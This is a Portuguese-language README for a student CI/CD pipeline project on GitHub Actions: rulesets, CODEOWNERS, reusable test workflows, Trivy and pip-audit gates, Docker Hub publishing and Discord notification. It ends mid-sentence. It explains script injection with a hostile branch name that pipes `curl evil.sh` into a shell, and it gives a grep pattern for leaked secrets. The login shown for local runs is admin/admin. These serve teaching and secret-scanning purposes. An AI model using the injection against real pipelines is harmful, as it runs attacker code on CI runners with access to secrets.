  | Acesso de escrita ao repositório | Abrir PRs e revisar |
  | Python 3.10, 3.11 ou 3.12 | Rodar os gates na sua máquina |
  | Docker | Rodar os gates em ambiente idêntico ao CI e subir a aplicação |
  | Servidor no Discord com permissão de criar webhook | Notificação do pipeline |
  | Conta no Docker Hub, com um access token | Publicação da imagem |

  Nenhuma credencial de nuvem é necessária.

  ---

  ## Configuração no GitHub

O pipeline depende de configurações externas ao código para controlar permissões,
proteção da `main`, credenciais e aprovações. No CD, essas configurações também
permitem que o GitHub Actions acesse a EC2 e execute o deployment no cluster
Kubernetes sem armazenar credenciais diretamente no repositório.

  ### Branch protection

  `Settings → Rules → Rulesets → New branch ruleset`, alvo `main`:

  | Regra | Valor | Por quê |
  | --- | --- | --- |
  | Require a pull request before merging | 1 aprovação | Ninguém faz commit direto na `main` |
  | Dismiss stale pull request approvals when new commits are pushed | marcado | Um commit novo derruba a aprovação anterior |
  | Require review from Code Owners | marcado | Ativa o efeito do `CODEOWNERS` |
  | Allowed merge methods | somente *Squash* | Um commit por PR na `main` |
  | Require status checks to pass | os 5 checks obrigatórios abaixo | **É este item que bloqueia o merge** |
  | Require branches to be up to date before merging | marcado | Os checks precisam ter rodado sobre a `main` atual, não sobre uma antiga |
  | Require linear history | marcado | Sem merge commits na `main` |
  | Block force pushes | marcado | Preserva o histórico |
  | Restrict deletions | marcado | A `main` não pode ser apagada |
  | Bypass list | vazia | A regra vale também para o dono do repositório |

  ### Required status checks

  | Check | Obrigatório | Por quê |
  | --- | --- | --- |
  | `Lint (ruff)` | Sim | Gate de estilo |
  | `test (3.10) / Test (Python 3.10)` | Sim | Gate funcional e de segurança |
  | `test (3.11) / Test (Python 3.11)` | Sim | idem |
  | `test (3.12) / Test (Python 3.12)` | Sim | idem |
  | `Build and push image` | Sim | Prova, em todo PR, que a imagem é construída |
  | `Deploy to staging (dummy)` | **Não** | Não roda em pull request |
  | `Notify pipeline result` | **Não** | É um aviso, não um gate |
  | `Code scanning results / Trivy` | **Não** | Ver abaixo |

  O nome dos três checks da matrix tem **duas partes**, separadas por barra: o job
  do chamador com o valor da matrix (`test (3.10)`) e o job de dentro do reusable
  (`Test (Python 3.10)`). É o GitHub compondo os dois lados de um
  `workflow_call` — e é por isso que refatorar o pipeline renomeia os checks e
  invalida a lista do ruleset.

  > [!WARNING]
  > `deploy-staging` **não** pode ser marcado como obrigatório: ele não roda em
  > pull request, e um check que nunca reporta bloquearia todo merge para sempre.
  > Os checks só aparecem na lista depois de rodarem pelo menos uma vez — se a
  > lista estiver vazia, abra um PR, deixe o CI rodar e volte para marcá-los.

  O check `Code scanning results / Trivy` aparece sozinho, criado pelo upload do
  SARIF, e reporta os alertas novos no código alterado pelo pull request. Deixamos
  fora dos obrigatórios de propósito: ele mede **alertas novos no diff**, enquanto
  o gate real do Trivy é o `exit-code: 1` dentro do job, que mede
  **vulnerabilidade existente**. Torná-lo obrigatório misturaria dois critérios
  diferentes e nos tiraria o controle sobre o que bloqueia.

  ### Variables e secrets

  `Settings → Secrets and variables → Actions`:

  | Nome | Aba | Uso |
| --- | --- | --- |
| `PYTHON_VERSIONS` | **Variables** | Versões de Python utilizadas na matrix do CI |
| `NOTIFY_WEBHOOK_URL` | **Secrets** | URL do webhook do Discord |
| `DOCKERHUB_USERNAME` | **Secrets** | Usuário do Docker Hub usado pelo CI para publicar a imagem |
| `DOCKERHUB_TOKEN` | **Secrets** | Access token do Docker Hub com permissão *Read & Write* |
| `DOCKERHUB_USERNAME_JESSICA` | **Secrets** | Usuário do Docker Hub utilizado pelo CD para montar a referência da imagem |
| `STAGING_URL` | **Secrets** do environment `staging` | URL fictícia utilizada pelo deploy de staging |
| `EC2_HOST` | **Secrets** | Endereço do host EC2 utilizado pelo CD |
| `EC2_USER` | **Secrets** | Usuário utilizado para acesso à EC2 |
| `EC2_SSH_KEY` | **Secrets** | Chave privada utilizada pelo CD para acesso à EC2 |

Os valores sensíveis não são armazenados no repositório. O GitHub Actions os disponibiliza
em tempo de execução por meio do contexto `secrets`. No caso do Kubernetes, as credenciais
do Docker Hub também são armazenadas em um `docker-registry secret` no cluster, permitindo
que os Pods façam o pull da imagem privada sem expor o token no manifesto.

  Se `PYTHON_VERSIONS` não existir, o `ci.yml` usa o valor de reserva e testa as
  mesmas três versões — o pipeline não quebra, só deixa de ser configurável sem commit.

  ### Environment

  `staging`, configurado com *required reviewers* e com a opção **Prevent
  self-review** marcada. O job `deploy-staging` declara esse environment e pausa
  até a aprovação. Secrets cadastrados dentro dele só ficam disponíveis para jobs
  que o declaram — é a diferença entre secret de repositório e secret com escopo de
  ambiente.

  | Opção | Valor |
  | --- | --- |
  | Required reviewers | os três membros do grupo |
  | Prevent self-review | **marcado** |

  O *Prevent self-review* bloqueia **quem disparou o run**, não quem abriu o pull
  request. Como é o merge que dispara o push na `main`, na prática ele separa dois
  papéis: quem clica em *Merge* não é quem clica em *Approve and deploy*.

  Isso não custa coordenação extra, porque o `CODEOWNERS` já obriga que o revisor
  de um PR seja outra pessoa. Quem revisa faz o merge, e o autor aprova o deploy.

  ### CODEOWNERS

  ```text
  *                       @weynne @diegotavares16 @jessicacamarco
  /.github/workflows/     @weynne @diegotavares16
  /k8s/                   @weynne @jessicacamarco
  ```

  A última regra que corresponde ao caminho é a que vale. Cada área tem um mantenedor ao lado do dono
  do repositório, então a revisão cai em quem conhece aquela parte: pipeline com
  [@diegotavares16](https://github.com/diegotavares16), manifestos com
  [@jessicacamarco](https://github.com/jessicacamarco). O que não corresponde a nenhuma
  regra específica o time revisa entre si, pela regra `*`.

  > [!NOTE]
  > Toda regra lista no mínimo **dois** donos de propósito. O autor de um PR não
  > pode aprovar o próprio PR, então uma regra de dono único deixaria sem revisor
  > possível toda mudança proposta por ele — e o merge travaria.

  ---

  ## Rodando localmente

  ### Os mesmos comandos do CI

  São exatamente os comandos que o pipeline executa, com as mesmas versões de
  ferramenta. Rodar localmente não é obrigatório e, quando tudo passa, é trabalho
  repetido. O ganho aparece quando algo quebra: o ciclo de correção vira segundos,
  em vez de commit → push → esperar o runner → corrigir → esperar de novo.

  ```bash
  python -m venv .venv
  source .venv/bin/activate            # Windows: .venv\Scripts\activate
  pip install -r requirements.txt -r requirements-dev.txt

  ruff check .                         # lint
  pytest -v                            # testes
  pip-audit -r requirements.txt        # auditoria de dependências
  ```

  Se a sua máquina tiver uma versão de Python fora da matrix (3.10–3.12), o Docker
  reproduz o ambiente do CI:

  ```bash
  docker run --rm -v "$PWD":/app -w /app python:3.12-slim bash -c \
    "pip install -q -r requirements-dev.txt && ruff check . && pytest -q && pip-audit -r requirements.txt"
  ```

  O scan do Trivy, com as mesmas opções do pipeline:

  ```bash
  docker run --rm -v "$PWD":/src -w /src aquasec/trivy:0.58.0 fs \
    --severity MEDIUM,HIGH,CRITICAL --ignore-unfixed --exit-code 1 .
  ```

  ### A aplicação

  ```bash
  docker build -t todolist:dev .
  docker run --rm -p 8080:5000 -e APP_COLOR=blue -e SESSION_KEY=local todolist:dev
  # http://localhost:8080 — login admin / admin
  ```

  > [!NOTE]
  > Porta 8080 no host de propósito: no macOS a 5000 é ocupada pelo AirPlay
  > Receiver, que responde `403` e gera confusão.

  ---

  ## Estrutura do repositório

  ```text
  .
  ├── .github/
  │   ├── CODEOWNERS                          # donos por caminho; revisor automático
  │   └── workflows/
  │       ├── ci.yml                          # o pipeline desta entrega
  │       ├── _reusable-test.yml              # steps de teste reutilizáveis
  │       ├── validate-ssh.yml                # do starter-kit, fora do escopo desta entrega
  │       └── cd*.yml.example                 # esqueletos inertes, fora do escopo desta entrega
  ├── app.py                                  # Flask + SQLite (rota /healthz usada pelos gates)
  ├── test_app.py                             # suíte pytest — 13 testes
  ├── requirements.txt                        # dependências de produção — alvo dos scans
  ├── requirements-dev.txt                    # pytest, ruff, pip-audit
  ├── pyproject.toml                          # configuração do ruff
  ├── Dockerfile                              # imagem da aplicação, publicada pelo job push
  ├── k8s/                                    # manifestos Kubernetes usados pelo CD
  ├── evidencias/                             # capturas da entrega, com índice próprio
  └── docs/                                   # referências do starter-kit
  ```

  O prefixo `_` em `_reusable-test.yml` sinaliza workflow de apoio: chamado por
  outro via `uses:` e nunca disparado por evento próprio.

  ---

  ## Arquivo por arquivo

  O starter-kit entrega a aplicação e os manifestos prontos. O grupo criou ou
  alterou apenas estes arquivos:

  | Arquivo | O que fizemos | Como |
  | --- | --- | --- |
  | `.github/CODEOWNERS` | criado | renomeado de `CODEOWNERS.example` |
  | `.github/workflows/ci.yml` | criado | renomeado de `ci.yml.example` |
  | `.github/workflows/_reusable-test.yml` | criado | renomeado de `_reusable-test.yml.example` |
  | `README.md` | substituído | era o README do professor |
  | `evidencias/` | criado | capturas da entrega, com índice |
  | `requirements.txt` | alterado e revertido | só nas branches de demonstração, nunca na `main` |

  > [!NOTE]
  > O GitHub Actions só executa arquivos `.yml` e `.yaml` dentro de
  > `.github/workflows/`. O sufixo `.example` é o que mantém os esqueletos inertes
  > até serem renomeados — por isso cada arquivo nasce de um `git mv`, e não de um
  > arquivo novo: assim o histórico mostra que ele veio do esqueleto.

  ---

  ### `.github/CODEOWNERS`

  ```bash
  git mv .github/CODEOWNERS.example .github/CODEOWNERS
  ```

  Três regras, uma por linha. Cada uma associa um caminho a quem o GitHub deve
  pedir revisão quando um PR altera aquele caminho.

  ```text
  *                       @weynne @diegotavares16 @jessicacamarco
  /.github/workflows/     @weynne @diegotavares16
  /k8s/                   @weynne @jessicacamarco
  ```

  | Bloco | O que faz |
  | --- | --- |
  | `*` | Regra de fundo: qualquer arquivo que não corresponda às outras. O time inteiro revisa |
  | `/.github/workflows/` | Mudança no pipeline. Revisão do dono do repositório ou do mantenedor do CI |
  | `/k8s/` | Manifestos de deploy. Dono do repositório ou a mantenedora dos manifestos |

  **A última regra que corresponde é a que vale**, não a primeira. Um PR que altera
  o `ci.yml` cai na segunda regra e ignora a primeira. Quem lê o arquivo de cima
  para baixo costuma supor o contrário — é o erro de leitura mais comum.

  **Toda regra tem no mínimo dois donos.** O autor de um PR não pode aprovar o
  próprio PR: numa regra de dono único, todo PR aberto por ele ficaria sem revisor
  possível e o merge travaria para sempre.

  Para o arquivo ter efeito, duas condições: os usuários precisam ter acesso de
  **escrita** e ter **aceito** o convite de colaborador — convite pendente faz o
  GitHub exibir "Unknown owner" e ignorar a linha em silêncio. E o ruleset da
  `main` precisa de **Require review from Code Owners** marcado, senão o arquivo
  só sugere revisores sem obrigar ninguém.

  ---

  ### `.github/workflows/ci.yml`

  ```bash
  git mv .github/workflows/ci.yml.example .github/workflows/ci.yml
  ```

  O workflow principal: 5 jobs, 365 linhas. É o **chamador** — concentra gatilhos,
  permissões e orquestração, e delega os steps de teste ao reusable.

  | Bloco | O que faz |
  | --- | --- |
  | `name:` | Nome que aparece na aba Actions e no texto do badge |
  | `on:` | Os três gatilhos que fazem o workflow rodar |
  | `permissions:` | Teto de privilégio do `GITHUB_TOKEN` para todo o workflow |
  | `concurrency:` | Cancela o run anterior da mesma branch |
  | `env:` | Valores de configuração não sensíveis |
  | `jobs.lint` | Gate de estilo com `ruff`, fora da matrix |
  | `jobs.test` | Chama o reusable uma vez por versão do Python |
  | `jobs.push` | Constrói a imagem e publica no Docker Hub, depois dos gates |
  | `jobs.deploy-staging` | Gate de aprovação humana via environment |
  | `jobs.notify` | Manda o resultado final para o Discord |

  #### `on:` — os três gatilhos

  ```yaml
  on:
    pull_request:
      branches: [main]
    push:
      branches: [main]
      tags: ['*']
  ```

  Cada um existe por um motivo diferente. **`pull_request`** é o que faz o CI ser
  um gate de merge — sem ele, o pipeline só rodaria depois do merge. **`push` na
  `main`** mantém o badge do README honesto sobre a saúde da branch principal.
  **`tags: ['*']`** submete toda tag aos mesmos gates, porque uma tag é candidata a
  release e nenhuma release deveria existir sem ter passado por lint, testes e
  scans.

  #### `permissions:` — menor privilégio

  ```yaml
  permissions:
    contents: read
  ```

  Sem esse bloco, o `GITHUB_TOKEN` herda a permissão padrão do repositório, que
  pode incluir escrita. Um workflow comprometido — por uma action de terceiro
  maliciosa, por exemplo — poderia escrever no repositório, criar releases ou
  apagar branches.

  O bloco no topo é o **padrão** de todos os jobs. Um job que precisa de mais pede
  explicitamente, e só ele recebe: o `test` declara `security-events: write` porque
  o reusable sobe SARIF.

  #### `concurrency:` — um run por branch

  ```yaml
  concurrency:
    group: ci-${{ github.ref }}
    cancel-in-progress: true
  ```

  O `group` é a chave: runs com a mesma chave não coexistem. Como a chave inclui a
  ref, dois PRs diferentes rodam em paralelo, mas dois pushes na mesma branch não —
  o novo cancela o antigo em vez de entrar na fila atrás dele.

  #### `env:` — o que não deve ficar fixo no código

  ```yaml
  env:
    DEFAULT_PYTHON_VERSION: '3.12'
  ```

  Usado pelo job `lint`, que não precisa da matrix inteira: `ruff` analisa o código
  estaticamente, sem executá-lo, então rodar nas três versões daria o mesmo
  resultado três vezes. Sem a variável, a versão ficaria escrita direto no step, e
  trocar de 3.12 para 3.13 exigiria caçar ocorrências pelo arquivo.

  #### `jobs.lint` — o gate mais rápido

  Cinco steps: `checkout` → `setup-python` → `cache` → `install` → `ruff check .`.

  A configuração do `ruff` vive no `pyproject.toml`, então este comando produz
  exatamente o mesmo resultado na máquina de quem escreveu o código e aqui. O job
  tem cache próprio, com chave `…-pip-lint-…`, para não competir com a chave dos
  jobs da matrix.

  #### `jobs.test` — a matrix chamando o reusable

  ```yaml
    test:
      permissions:
        contents: read
        security-events: write
      strategy:
        fail-fast: false
        matrix:
          python-version: ${{ fromJSON(vars.PYTHON_VERSIONS || '["3.10", "3.11", "3.12"]') }}
      uses: ./.github/workflows/_reusable-test.yml
      with:
        python-version: ${{ matrix.python-version }}
  ```

  Cinco decisões em dez linhas:

  **`uses:` em vez de `steps:`.** Este job não tem `runs-on` nem `steps` — quem
  executa steps é o reusable. É o erro mais comum: acrescentar `runs-on` aqui
  quebra o workflow com erro de validação.

  **A matrix vive no chamador.** O `strategy.matrix` multiplica este job em três, e
  cada cópia chama o reusable uma vez. Trocar as versões testadas não toca nos
  steps, e mudar os steps não toca nas versões.

  **`fail-fast: false`.** O padrão do GitHub é `true`, que **cancela** as outras
  versões no instante em que uma falha. Com `false`, as três terminam — e uma
  execução responde se o problema é de uma versão só ou de todas, em vez de três
  ciclos de corrigir e rodar de novo.

  **As versões vêm de uma variável.** `vars.PYTHON_VERSIONS` é configuração, não
  código: ampliar a cobertura é uma edição em `Settings`, sem commit. O literal
  depois do `||` é o valor de reserva — sem ele, um clone sem a variável cadastrada
  quebraria no `fromJSON` de uma string vazia.

  **`with:` é o contrato.** O valor da matrix entra no reusable pelo input
  `python-version`. É por isso que o mesmo dado tem dois nomes: `matrix.` aqui,
  `inputs.` lá dentro.

  #### `jobs.push` — a imagem só sai depois dos gates

  ```yaml
    push:
      name: Build and push image
      needs: [lint, test]
      runs-on: ubuntu-latest
      env:
        IMAGE_NAME: app-k8s-todolist
        DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}
  ```

  **`needs: [lint, test]`** é a garantia principal: se qualquer gate reprova, o job
  é pulado, e uma imagem com dependência vulnerável ou teste quebrado nunca chega ao
  Docker Hub.

  O primeiro step calcula as tags, seguindo a tabela do `docs/ci-pipeline.md`:

  | Evento | Tag principal | Exemplo |
  | --- | --- | --- |
  | Pull request para a `main` | `PR-<número>` | `PR-12` |
  | Push na `main` | `latest` | `latest` |
  | Push de tag | a própria tag | `v1.2.0` |

  Toda imagem recebe também o **hash curto do commit**, o que permite rastrear um
  pod até o commit exato. Em pull request, esse hash vem do head da branch, e não do
  merge temporário que o GitHub monta. Caracteres que o Docker não aceita em tag,
  como `/`, viram `-`.

  ```yaml
        - name: Build and push
          uses: docker/build-push-action@53b7df96…  # v7.3.0
          with:
            context: .
            push: ${{ env.DOCKERHUB_USERNAME != '' }}
            tags: ${{ steps.tags.outputs.tags }}
            build-args: |
              IMAGE_TAGS=${{ steps.tags.outputs.image_tags }}
            cache-from: type=gha
            cache-to: type=gha,mode=max
  ```

  **`build-args: IMAGE_TAGS`** entrega as tags ao `Dockerfile`, que as repassa à
  aplicação: o rodapé mostra de qual build o pod veio.

  **`push:` condicionado ao secret.** O `DOCKERHUB_USERNAME` é lido no `env:` do
  job porque o contexto `secrets` não pode ser usado num `if:`. Sem ele — num pull
  request vindo de fork, ou num clone deste repositório —, o login é pulado e a
  imagem é construída sem ser publicada. O `Dockerfile` continua sendo validado, e
  o job não falha num login sem credenciais.

  **`cache-from` e `cache-to` com `type=gha`** guardam as camadas da imagem no
  cache do GitHub Actions. Quando só o `app.py` muda, a camada de dependências é
  reaproveitada.

  #### `jobs.deploy-staging` — aprovação humana sem escrever lógica

  ```yaml
    deploy-staging:
      name: Deploy to staging (dummy)
      needs: [lint, test, push]
      if: github.event_name == 'push' && github.ref == 'refs/heads/main'
      runs-on: ubuntu-latest
      environment:
        name: staging
  ```

  O step apenas executa um `echo`: o deploy é simulado. O que se demonstra é o
  bloco **`environment:`**: ao declarar um environment que tem *required
  reviewers*, o job aparece como *Waiting* e pausa até alguém aprovar em **Review
  deployments**. Nenhuma linha de código nossa implementa a espera; a plataforma
  faz isso.

  **`needs: [lint, test, push]`** é o que cria ordem: o deploy só começa depois
  que os gates passaram e a imagem foi publicada, então staging nunca recebe um
  commit reprovado nem uma imagem que não existe no Docker Hub. **O `if:`**
  restringe o job a push na `main` — pedir aprovação a cada pull request cansaria
  os revisores rapidamente.

  > [!WARNING]
  > Este job **não** pode ser marcado como required status check. Ele não roda em
  > pull request, e um check que nunca reporta deixa o merge bloqueado para sempre.

  #### `jobs.notify` — dois steps e os cuidados de cada um

  O primeiro step decide a mensagem; o segundo envia.

  ```yaml
        - name: Compose message
          id: msg
          env:
            LINT_RESULT: ${{ needs.lint.result }}
            TEST_RESULT: ${{ needs.test.result }}
            DEPLOY_RESULT: ${{ needs.deploy-staging.result }}
          run: |
            echo "status=SUCCESS" >> "$GITHUB_OUTPUT"
  ```

  **`$GITHUB_OUTPUT`** é como um step entrega valor a um step seguinte: o runner
  expõe o caminho de um arquivo nessa variável, e o step anexa linhas
  `nome=valor`. O **`id: msg`** é o que torna esses valores endereçáveis como
  `steps.msg.outputs.status` daqui para frente.

  **`skipped` conta como neutro.** `deploy-staging` fica `skipped` em pull request,
  porque a condição `if:` dele não é satisfeita. Tratar isso como falha faria todo PR reportar um
  pipeline vermelho.

  ```yaml
        - name: Send Discord notification
          if: env.WEBHOOK_URL != ''
          env:
            WEBHOOK_URL: ${{ secrets.NOTIFY_WEBHOOK_URL }}
            BRANCH: ${{ github.head_ref || github.ref_name }}
          run: |
            jq -n --arg branch "${BRANCH}" '…' \
            | curl -sS --fail-with-body -d @- "$WEBHOOK_URL"
  ```

  **Todo valor entra por `env:`, e o shell lê como `$VAR`.** Escrever
  `${{ github.head_ref }}` direto dentro do `run:` colaria o valor no **texto do
  script** antes de o shell executá-lo — uma branch chamada `x";curl evil.sh|sh;"`
  viraria código executável. É a injeção de script clássica do Actions. Por `env:`
  o valor é apenas dado.

  **`head_ref` e não `ref_name`.** Num `pull_request`, o `github.ref_name` devolve
  `2/merge` — a ref interna que o GitHub cria para testar o merge, que não é nome
  de branch nenhum. O `github.head_ref` carrega a branch de origem de verdade, e
  fica vazio fora de pull request; daí o `||`, que cai no `ref_name` em push e em
  tag.

  **`--fail-with-body` no `curl`.** Sem ele o `curl` sai com código 0 mesmo quando
  o Discord recusa o payload: o job fica verde e a mensagem nunca chega. Com ele o
  step fica vermelho e o log mostra o motivo que o Discord devolveu.

  **`jq` monta o JSON**, em vez de concatenação de string: uma aspa ou um acento
  num nome de branch não geram um JSON malformado. O `jq` vem
  pré-instalado nos runners Ubuntu do GitHub.

  **A condição fica no step, não no job.** O contexto `secrets` não está disponível em
  `if:` de job — daí o `if: env.WEBHOOK_URL != ''` aqui. Sem ele, um clone deste
  repositório sem webhook configurado falharia num `curl` para uma URL vazia.

  **`if: always()` no job** é obrigatório: um job que depende do sucesso dos
  anteriores nunca dispararia numa falha, que é exatamente quando a notificação
  importa.

  ---

  ### `.github/workflows/_reusable-test.yml`

  ```bash
  git mv .github/workflows/_reusable-test.yml.example .github/workflows/_reusable-test.yml
  ```

  O prefixo `_` é convenção: sinaliza workflow de apoio, chamado por outro via
  `uses:` e nunca disparado por evento próprio.

  | Bloco | O que faz |
  | --- | --- |
  | `on: workflow_call` | Declara o contrato: é isto que torna o arquivo chamável |
  | `inputs.python-version` | O único parâmetro. Obrigatório, tipo string |
  | `permissions:` | Teto do token dentro deste workflow |
  | steps 1–4 | checkout → setup-python → cache → install |
  | step Trivy | Primeiro gate de segurança, antes dos testes |
  | step upload SARIF | Envia o relatório para o code scanning |
  | steps pytest e pip-audit | Gate funcional e gate de dependências |

  #### `workflow_call` e o input

  ```yaml
  on:
    workflow_call:
      inputs:
        python-version:
          description: 'Python version used to run the tests'
          type: string
          required: true
  ```

  `workflow_call` é o que diferencia um reusable de um workflow comum: ele não tem
  gatilho de evento, só pode ser invocado. O input é **singular** — este arquivo
  recebe **uma** versão por chamada e não sabe que existe uma matrix. Quem
  multiplica é o `ci.yml`.

  #### Cache, e por que a chave é composta

  ```yaml
            key: ${{ runner.os }}-pip-${{ inputs.python-version }}-${{ hashFiles('requirements*.txt') }}
            restore-keys: |
              ${{ runner.os }}-pip-${{ inputs.python-version }}-
  ```

  Três componentes na chave, cada um evitando um problema: **sistema do runner**
  porque um pacote *wheel* compilado para Linux não serve no macOS; **versão do Python** porque
  `cp310` e `cp312` são incompatíveis; **hash dos requirements** porque mudar
  dependência tem que invalidar o cache.

  Chave igual à de um run anterior significa *cache hit* e nada é baixado. Chave
  diferente significa *miss*, mas o `restore-keys` casa por prefixo e recupera um
  cache próximo, aproveitando parte da instalação. O objetivo não é economizar
  minutos de máquina, e sim dar retorno rápido no PR.

  #### O step do Trivy

  ```yaml
          with:
            scan-type: fs
            scan-ref: .
            severity: MEDIUM,HIGH,CRITICAL
            exit-code: '1'
            ignore-unfixed: true
            format: sarif
            output: trivy-results.sarif
  ```

  | Campo | Efeito |
  | --- | --- |
  | `scan-type: fs` | Analisa arquivos e manifestos, sem precisar construir uma imagem |
  | `scan-ref: .` | A raiz do repositório |
  | `severity` | A faixa que reprova. Começa em `MEDIUM` — ver [Divergências](#divergências-em-relação-ao-enunciado) |
  | `exit-code: '1'` | **É isto que transforma o scan em gate.** Sem ele, o scan só informa |
  | `ignore-unfixed: true` | Descarta CVE sem patch, que manteria o build vermelho sem ação possível |
  | `format: sarif` | Formato que alimenta o code scanning do GitHub |

  #### O upload do SARIF

  ```yaml
        - name: Upload Trivy report to the Security tab
          if: always()
          uses: github/codeql-action/upload-sarif@b96794f0…
          with:
            sarif_file: trivy-results.sarif
            category: trivy-python-${{ inputs.python-version }}
  ```

  Dois detalhes que não são preferência. **`if: always()`**: o step anterior sai com
  código 1 quando acha vulnerabilidade, e sem o `always()` este seria pulado —
  o relatório nunca chegaria ao code scanning exatamente quando há o que reportar.
  **`category` por versão**: são três uploads do mesmo commit, um por job da
  matrix; sem categoria distinta eles se sobrescrevem, e uploads simultâneos podem
  colidir.

  #### `pytest` e `pip-audit`

  ```yaml
        - name: Run tests (pytest)
          run: pytest -v

        - name: Audit dependencies (pip-audit)
          run: pip-audit -r requirements.txt
  ```

  O `-r requirements.txt` mantém o gate focado nas dependências de **produção**.
  Sem ele, `pip-audit` audita o ambiente inteiro — e um CVE no `pytest` ou no
  `ruff` derrubaria o pipeline da aplicação sem ter relação com o que vai para
  produção.

  ---

  ### `README.md`

  O arquivo que veio no kit é do professor e explica como usar o template. Foi
  substituído inteiro pela documentação da entrega — este arquivo, que é um item
  explícito da rubrica.

  ---

  ### `requirements.txt`

  Único arquivo de código que o grupo toca, e apenas na
  [demonstração de shift-left](#2-reproduzir-a-demonstração-de-shift-left): a linha
  do `requests` é rebaixada para 2.31.0 para ver o gate reprovar, e devolvida
  para 2.33.0 na mesma branch. A aplicação em `app.py` não foi alterada em momento
  nenhum.

  ---

  ## Variáveis, inputs e secrets

  Nenhum valor fica fixo e espalhado pelo YAML. Cada tipo de dado entra por um mecanismo
  diferente, escolhido pelo escopo e pela sensibilidade.

  | Mecanismo | Onde é declarado | Usado para | Exemplo aqui |
  | --- | --- | --- | --- |
  | `env` de workflow | Topo do `ci.yml` | Valor repetido, não sensível | `DEFAULT_PYTHON_VERSION: '3.12'` |
  | `env` de job | Dentro do job | Valor usado por vários steps do mesmo job | `IMAGE_NAME`, `DOCKERHUB_USERNAME` |
  | `env` de step | Dentro do step | Passar valores ao shell com segurança, inclusive secrets | `WEBHOOK_URL`, `RUN_URL` |
  | `matrix` | `strategy` do job chamador | Dimensão que multiplica o job | `python-version` |
  | `inputs` | `workflow_call` do reusable | Contrato entre chamador e reusable | `python-version` |
  | Variável de repositório | `Settings → Secrets and variables → Variables` | Configuração não sensível que muda sem commit | `PYTHON_VERSIONS` |
  | Secret de repositório | `Settings → Secrets and variables → Secrets` | Credencial usada por qualquer job | `NOTIFY_WEBHOOK_URL`, `DOCKERHUB_TOKEN` |
  | Secret de environment | Dentro do environment `staging` | Credencial que só um ambiente pode ler | `STAGING_URL` |

  O `DEFAULT_PYTHON_VERSION` existe porque o job `lint` não precisa da matrix
  inteira. Sem a variável, a versão ficaria escrita direto no step, e trocar de
  3.12 para 3.13 exigiria caçar ocorrências pelo arquivo.

  As versões testadas saem de uma **variável de repositório**, não de uma lista
  fixa no YAML:

  ```yaml
  matrix:
    python-version: ${{ fromJSON(vars.PYTHON_VERSIONS || '["3.10", "3.11", "3.12"]') }}
  ```

  Assim ampliar ou reduzir a cobertura é uma edição em `Settings`, sem commit e sem
  novo PR. O literal depois do `||` é um **valor de reserva**: sem ele, um clone deste
  repositório sem a variável cadastrada quebraria no `fromJSON` de uma string
  vazia. Variável, e não secret, porque a informação não é sensível — o valor
  aparece no log do run de qualquer forma.

  O `python-version` aparece com dois nomes diferentes de propósito: é
  `matrix.python-version` no `ci.yml` e `inputs.python-version` no reusable. O
  reusable não sabe que existe uma matrix — ele recebe **uma** versão por chamada.
  Quem multiplica é o chamador.

  > [!CAUTION]
  > A URL de um webhook do Discord funciona como credencial: quem a tem consegue
  > publicar no canal. Nunca faça commit do valor de um secret, nem em comentário
  > nem em arquivo de exemplo — um segredo no histórico do Git continua lá depois
  > de "apagado" do arquivo.

  ### Inputs do CD

Os workflows de deployment recebem a tag da imagem como input manual. Isso permite
escolher exatamente qual versão publicada no Docker Hub será implantada, sem reconstruir
a imagem durante o CD.

| Workflow | Input | Função |
| --- | --- | --- |
| `cd.yml` | `image_tag` | Define a tag da imagem utilizada no Rolling Update |
| `cd-blue-green.yml` | `color` e `image_tag` | Define o ambiente de destino e a versão da imagem no Blue/Green |
| `cd-blue-green-switch.yml` | `color` | Define para qual ambiente o tráfego de produção será direcionado |

  ---

  ## Verificação

  ```bash
  # O reusable está mesmo sendo chamado (criar o arquivo não basta):
  grep -n "uses: ./.github/workflows/_reusable-test.yml" .github/workflows/ci.yml

  # Nenhuma action presa a tag mutável — todas fixadas por SHA de commit:
  grep -hE 'uses: [a-z].*@v[0-9]' .github/workflows/*.yml || echo "todas fixadas por SHA"

  # A mesma varredura de segredos que o professor faz no histórico. As únicas
  # ocorrências esperadas são o próprio padrão, citado neste README, e o exemplo
  # de chave SSH em docs/cd-*.md, do starter-kit — nenhuma URL de webhook:
  git log -p --all | grep -nE 'discord\.com/api/webhooks|hooks\.slack\.com|dckr_pat_|AKIA|BEGIN OPENSSH PRIVATE KEY'
  ```

  Na interface do GitHub:

  - **Actions** — o run do último push na `main` com os quatro checks verdes
  - **Em um PR com dependência vulnerável** — alertas do Trivy anotados na linha alterada e botão de merge cinza
  - **Após um merge na `main`** — `Deploy to staging (dummy)` em *Waiting*, com **Review deployments**
  - **Discord** — card verde a cada run bem-sucedido e vermelho quando um gate reprova, com link para o run
  - **Docker Hub** — a imagem `app-k8s-todolist` com `latest` e o hash curto do commit após um merge na `main`, e `PR-<número>` a cada pull request

  ---

  ## Solução de problemas

  **O CI roda, fica vermelho, e o merge acontece mesmo assim.** Os required status
  checks não foram marcados no ruleset. Os checks só aparecem na lista depois de
  rodarem pelo menos uma vez: abra um PR, deixe o CI rodar e volte para marcá-los.

  **O merge está bloqueado por um check que não existe mais.** Os nomes dos checks
  mudam quando o pipeline é refatorado — introduzir a matrix ou extrair o reusable
  renomeia todos eles. Rode o CI uma vez para os novos nomes aparecerem e marque-os de novo.

  **`CODEOWNERS` com aviso "Unknown owner".** O usuário listado não tem acesso de
  escrita ao repositório, ou o convite de colaborador ainda não foi aceito. A regra
  é ignorada silenciosamente até isso ser resolvido.

  **Um PR não consegue ser aprovado por ninguém.** O autor não pode aprovar o
  próprio PR. Se ele for o único code owner do caminho tocado, a mudança precisa ser
  proposta por outra pessoa.

  **Um commit na `main` saiu com a mensagem fora do padrão.** O ruleset só permite
  *squash*, e no squash o GitHub usa o **título do PR** como mensagem do commit —
  título que vem preenchido com o nome da branch quando ela tem mais de um commit.
  Corrigir depois exigiria force push, que o ruleset bloqueia; o que evita o
  problema é revisar o título ao abrir o PR.

  **O job `notify` fica verde mas nada chega no canal.** O secret
  `NOTIFY_WEBHOOK_URL` não está cadastrado, e a condição `if: env.WEBHOOK_URL != ''`
  pula o envio de propósito. Confira em `Settings → Secrets and variables → Actions`.

  **`Log in to Docker Hub` falha com `unauthorized`.** O `DOCKERHUB_TOKEN` foi
  revogado, expirou ou não tem permissão de escrita. Gere outro em Docker Hub →
  *Account settings* → *Personal access tokens* e atualize o secret.

  **O job `Build and push image` fica verde, mas nada aparece no Docker Hub.** O
  secret `DOCKERHUB_USERNAME` não está cadastrado: sem ele a imagem é só
